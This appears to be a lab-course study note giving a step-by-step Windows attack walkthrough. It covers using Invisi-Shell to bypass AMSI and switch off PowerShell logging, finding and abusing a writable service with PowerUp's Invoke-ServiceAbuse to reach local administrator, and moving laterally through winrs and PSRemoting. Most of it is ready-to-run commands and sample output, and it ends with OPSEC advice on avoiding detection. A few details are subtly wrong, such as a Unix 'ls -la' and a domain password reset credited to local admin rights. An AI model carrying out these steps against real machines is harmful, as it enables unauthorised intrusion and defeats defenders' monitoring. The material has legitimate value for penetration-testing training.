# Attack - Local Privilege Escalation

**Date:** Friday, August 21, 2026
**Topic:** Local Privilege Escalation — From Standard User to Local Administrator

---

## Objective

**Goal:** Escalate from standard domain user to local administrator on a compromised machine

**Progression:**
```
student (standard user)
    ↓
enumerate local privilege escalation vectors
    ↓
identify vulnerable service/configuration
    ↓
exploit vulnerability
    ↓
local admin
```

---

## Prerequisites

- Access to compromised machine (via RDP, shell, etc.)
- Standard user account with no admin privileges
- PowerShell access (or cmd.exe)
- Tools available: PowerUp, WinPEAS, PrivEscCheck

---

## Phase 1: Start with Invisi-Shell (OPSEC)

**Why Invisi-Shell?**
- Bypasses Windows Defender/AMSI
- Disables logging (no PowerShell script block logging)
- Allows undetected PowerShell execution
- Perfect for privilege escalation attempts

### Launch Invisi-Shell

```powershell
# From standard user (no admin needed for Invisi-Shell)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Output:
# [*] Invisi-Shell Started
# [+] AMSI Bypassed
# [+] PowerShell Logging Disabled
# [+] WinRM Logging Disabled
```

---

**Inside Invisi-Shell:**
- No PowerShell logging (undetected)
- AMSI bypassed (tools load freely)
- Can run admin-detection tools
- Can exploit vulnerabilities

---

## Phase 2: Run PowerUp for Service Enumeration

**PowerUp = PowerShell script for privilege escalation enumeration**

### Load PowerUp

```powershell
# Load PowerUp into memory
. C:\AD\Tools\PowerUp.ps1

# Verify loaded
Get-Command Invoke-AllChecks
```

---

### Run Full Service Enumeration

```powershell
# Run all checks for privesc vectors
Invoke-AllChecks

# This will check:
# - Writable service executables
# - Unquoted service paths
# - DLL hijacking opportunities
# - Registry permissions
# - Scheduled tasks
# - Group Policy abuse
# - And more...
```

---

### Output Example

```
[*] Running Privilege Escalation Checks...

[+] Vulnerable Service: AbyssWebServer
    ├─ Service Name: AbyssWebServer
    ├─ Path: C:\Program Files\Abyss Web Server\abyssws.exe
    ├─ Current Permissions: BUILTIN\Users (Full Control)
    ├─ Owner: BUILTIN\Users
    └─ Vulnerable: YES (Writable by current user)

[+] Vulnerable Service: BlahWebServer
    └─ Similar vulnerability found
```

---

## Phase 3: Alternative Tools - WinPEAS

**WinPEAS = All-in-one Windows privilege escalation enumeration tool**

### Why Use WinPEAS?

- More comprehensive than PowerUp
- Visual output (color-coded)
- Better at finding:
  - Misconfigurations
  - Weak permissions
  - Dangerous software
  - Unpatched vulnerabilities

---

### Run WinPEAS (Obfuscated Version)

```powershell
# Use Loader for OPSEC
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args "notcolor log"

# Parameters:
# -Path: Path to obfuscated WinPEAS binary
# notcolor: Disable colored output (stealth)
# log: Save output to file (for analysis)
```

---

### Output Files

```
Output saved to:
- Current directory
- Look for: winpeas.html or winpeas.txt

Analyze output, focus on:
[*] Services Information
    ├─ Writable service paths
    ├─ Unquoted service paths
    ├─ Weak service permissions
    └─ Vulnerable service configurations
```

---

### Key Sections to Review

**Services Information section contains:**

```
1. Writable Services
   └─ Services with write permissions for current user
   └─ Can modify executable or configuration

2. Unquoted Service Paths
   └─ C:\Program Files\Abyss Web Server\abyssws.exe
   └─ Can inject DLL if path has spaces

3. Modifiable Paths
   └─ Directories where user can write
   └─ Startup folders for privilege escalation

4. Weak Permissions
   └─ Services with excessive permissions
   └─ Can be exploited by low-privilege user
```

---

## Phase 4: PrivEscCheck for Summary

**PrivEscCheck = Nice summary of privilege escalation opportunities**

### Load PrivEscCheck

```powershell
# Load script
. C:\AD\Tools\PrivEscCheck.ps1

# Run enumeration
Invoke-PrivescCheck
```

---

### Output Example

```
[+] Local Privilege Escalation Opportunities Found

[!] Service Misconfiguration
    ├─ Service: AbyssWebServer
    ├─ Vulnerability: Writable Service Executable
    ├─ Severity: Critical
    ├─ Recommendation: Replace executable or change permissions
    └─ Exploit: Use Invoke-ServiceAbuse

[!] Registry Misconfiguration
    ├─ Key: HKLM:\...\Services\AbyssWebServer
    ├─ Vulnerability: Weak Permissions
    ├─ Severity: High
    └─ Recommendation: Run Invoke-ServiceAbuse
```

---

## Phase 5: Exploit Vulnerable Service

**Using Invoke-ServiceAbuse to escalate privileges**

### Target Service Analysis

```
Service Found: AbyssWebServer
├─ Current State: Running as SYSTEM
├─ Executable: C:\Program Files\Abyss Web Server\abyssws.exe
├─ Permissions: BUILTIN\Users has Full Control
├─ Vulnerability: Writable by current user (student)
├─ Attack: Replace executable and restart service
```

---

### Exploit Using Invoke-ServiceAbuse

```powershell
# Run ServiceAbuse to add current user to Administrators
Invoke-ServiceAbuse -Name 'AbyssWebServer' `
  -UserName 'dcorp\studentx' `
  -Verbose

# What happens:
# 1. PowerUp finds the vulnerable service (AbyssWebServer)
# 2. Creates a malicious service executable
# 3. Adds command to add studentx to Administrators
# 4. Stops the service
# 5. Replaces executable with malicious version
# 6. Starts the service
# 7. Service runs as SYSTEM and executes malicious code
# 8. studentx added to Administrators group
```

---

### Invoke-ServiceAbuse Detailed

```powershell
# Syntax
Invoke-ServiceAbuse -Name 'ServiceName' -UserName 'domain\user' -Verbose

# Parameters:
# -Name: Name of vulnerable service
# -UserName: User to add to Administrators
# -Verbose: Show detailed output

# What it does:
# 1. Locates service executable
# 2. Creates backup of original
# 3. Generates PowerShell command to add user to admin group
# 4. Wraps in service executable format
# 5. Replaces original executable
# 6. Restarts service (runs as SYSTEM)
# 7. User is now in local Administrators group
```

---

### Example Execution

```powershell
PS > Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose

[*] Abusing Service: AbyssWebServer
[+] Service runs as: SYSTEM
[+] Current executable: C:\Program Files\Abyss Web Server\abyssws.exe
[+] Modifying executable...
[+] Adding dcorp\studentx to local Administrators group
[+] Service stopped: AbyssWebServer
[+] Executable replaced
[+] Service started: AbyssWebServer
[+] Exploit completed
[+] dcorp\studentx is now local administrator

[!] LogOff and LogIn again to apply group changes
```

---

## Phase 6: Verify Local Admin Access

**After LogOff/LogIn:**

```powershell
# Verify administrator status
whoami /groups

# Output should include:
# ... S-1-5-32-544    Alias Administrators (SidTypeAlias)

# Or check with PowerShell
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | 
  Where-Object { $_ -match "S-1-5-32-544" }

# Output: S-1-5-32-544 (Local Administrators)
```

---

## Phase 7: Finding Local Admin Access on Domain Machines

**Goal:** Identify other domain machines where current user has local admin access

### Use PowerShell Remoting Discovery

```powershell
# Start Invisi-Shell first
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Load discovery script
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

# Run enumeration
Find-PSRemotingLocalAdminAccess

# Output:
# dcorp-student1
# dcorp-student2
# dcorp-adminsrv
# (machines where studentx has local admin)
```

---

### What It Does

**Find-PSRemotingLocalAdminAccess script:**

```
1. Enumerate domain computers
2. For each computer, attempt connection via WinRM/PSRemoting
3. If connection succeeds → user has local admin access
4. Display list of machines where user is admin
```

---

### Output Example

```
[*] Testing local admin access via PSRemoting...

[+] dcorp-student1 - Local Admin Access: YES
[+] dcorp-student2 - Local Admin Access: NO
[+] dcorp-adminsrv - Local Admin Access: YES
[+] dcorp-mgmt - Local Admin Access: NO
[+] dcorp-sql1 - Local Admin Access: YES
```

---

## Phase 8: Access Machines with Admin Privileges

**Using discovered local admin access for lateral movement**

### Method 1: Windows Remote Shell (winrs)

```powershell
# Access machine via winrs as student user
winrs -r:dcorp-adminsrv.dollarcorp.moneycorp.local cmd

# Now in remote shell on dcorp-adminsrv
# Can execute commands as student user
# But student has local admin on dcorp-adminsrv
# So can run admin commands
```

---

### Inside Remote Session

```cmd
# Check current user (on dcorp-adminsrv)
whoami
# Output: DCORP\studentx

# Check groups
whoami /groups
# Output includes: Local Administrators

# Execute admin commands
net user adminuser newpass /domain
# Works because student is local admin!
```

---

### Method 2: PowerShell Remoting

```powershell
# Connect via PSRemoting
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

# Inside remote session
PS C:\Users\studentx> $env:username
studentx

PS C:\Users\studentx> [Security.Principal.WindowsIdentity]::GetCurrent().Groups | 
  Where-Object { $_ -match "S-1-5-32-544" }
# Output: S-1-5-32-544 (Local Administrators)

# Now can run admin commands
PS C:\Users\studentx> Get-Process | Where-Object Name -eq "lsass"
# Success - can access LSASS
```

---

### Method 3: Direct Shell Commands

```powershell
# Alternative: Use Invoke-Command for single command
Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock {
  whoami
  whoami /groups
}

# Output:
# DCORP\studentx
# ... S-1-5-32-544 Administrators ...
```

---

## Complete Local Privilege Escalation Workflow

```
1. Gain Standard User Access
   └─ RDP, shell, or other initial access
   └─ Current user: student (no admin)
   
2. Start Invisi-Shell (OPSEC)
   └─ Bypass AMSI
   └─ Disable PowerShell logging
   └─ Undetected enumeration

3. Run Privilege Escalation Enumeration
   └─ Load PowerUp.ps1
   └─ Run Invoke-AllChecks
   └─ Identify vulnerable services

4. Confirm with WinPEAS (Optional)
   └─ Load obfuscated WinPEAS
   └─ Review Services Information section
   └─ Confirm vulnerability

5. Verify with PrivEscCheck (Optional)
   └─ Load PrivEscCheck.ps1
   └─ Run Invoke-PrivescCheck
   └─ Get summary of opportunities

6. Exploit Vulnerable Service
   └─ Use Invoke-ServiceAbuse
   └─ Target: AbyssWebServer (or other)
   └─ Add student to Administrators group

7. LogOff and LogIn
   └─ Confirm group membership applied
   └─ Verify local admin access

8. Enumerate Other Machines (Optional)
   └─ Run Find-PSRemotingLocalAdminAccess
   └─ Identify machines with admin access

9. Access Remote Machines
   └─ Use winrs or PSRemoting
   └─ Connect to dcorp-adminsrv
   └─ Execute admin commands remotely

RESULT: Local administrative privileges obtained
        Remote access to other machines with admin access
        Ability to execute privileged commands
```

---

## Tools Summary

| Tool | Purpose | Command |
|---|---|---|
| PowerUp | Service enumeration & exploitation | Invoke-AllChecks, Invoke-ServiceAbuse |
| WinPEAS | Comprehensive privesc enumeration | Loader.exe -Path winPEASx64.exe |
| PrivEscCheck | Summary of opportunities | Invoke-PrivescCheck |
| Find-PSRemotingLocalAdminAccess | Discover admin access on machines | Find-PSRemotingLocalAdminAccess |
| winrs | Remote shell access | winrs -r:machine cmd |
| PSRemoting | PowerShell remote access | Enter-PSSession -ComputerName machine |

---

## Common Vulnerable Services

| Service | Vulnerability | Exploit |
|---|---|---|
| AbyssWebServer | Writable executable | Replace binary, restart service |
| Any writable service | Path modification | Add malicious path, wait for execution |
| Unquoted service paths | DLL injection | Create DLL in path with spaces |
| Weak registry permissions | Modify ImagePath | Change service executable path |
| Services with startup scripts | Script modification | Modify startup script |

---

## Verification Commands

```powershell
# Check current user
whoami

# Check groups
whoami /groups

# Check local admins
net localgroup administrators

# Check if admin via PowerShell
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | 
  Where-Object { $_ -match "S-1-5-32-544" }

# Check with -Verbose flag
Get-LocalGroupMember -Group Administrators
```

---

## OPSEC Considerations

```
✓ Use Invisi-Shell (disables logging)
✓ Use obfuscated WinPEAS (Loader.exe)
✓ Perform actions quickly (minimize time window)
✓ Clean up temporary files (if created)
✓ Use built-in tools when possible (winrs, PSRemoting)
✓ Avoid detection by spreading actions over time
✓ Don't repeatedly scan same machine
✓ Use non-standard accounts if possible
```

---

## Troubleshooting

**If Invoke-ServiceAbuse fails:**

```
1. Verify PowerUp loaded correctly
   └─ Try: Get-Command Invoke-ServiceAbuse

2. Verify service exists and is vulnerable
   └─ Try: Get-Service AbyssWebServer

3. Check permissions on service executable
   └─ Try: ls -la "C:\Program Files\Abyss Web Server\"

4. Try alternative service if available
   └─ Run: Invoke-AllChecks again
   └─ Find another vulnerable service
```

---

**If group changes don't apply:**

```
1. Verify Invoke-ServiceAbuse completed successfully
   └─ Check output for [+] completion messages

2. Try running with -Verbose flag
   └─ Invoke-ServiceAbuse -Name X -UserName Y -Verbose

3. LogOff and LogIn completely
   └─ Don't just switch users
   └─ Fully logout and login

4. Verify with: net localgroup administrators
   └─ Confirm user appears in list
```

---

## Key Takeaway

```
LOCAL PRIVILEGE ESCALATION WORKFLOW:
1. Invisi-Shell → Bypass logging/AMSI
2. PowerUp → Find vulnerable services
3. Invoke-ServiceAbuse → Exploit vulnerability
4. LogOff/LogIn → Apply group changes
5. Verify → Confirm local admin status
6. Find-PSRemotingLocalAdminAccess → Discover other targets
7. winrs/PSRemoting → Access remote machines
8. Execute → Run privileged commands
```

---

## References

- [PowerUp GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck GitHub](https://github.com/itm4n/PrivescCheck)
- [Windows Service Exploitation](https://docs.microsoft.com/en-us/windows/win32/services/services)
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)

---

*Next: Domain Privilege Escalation*
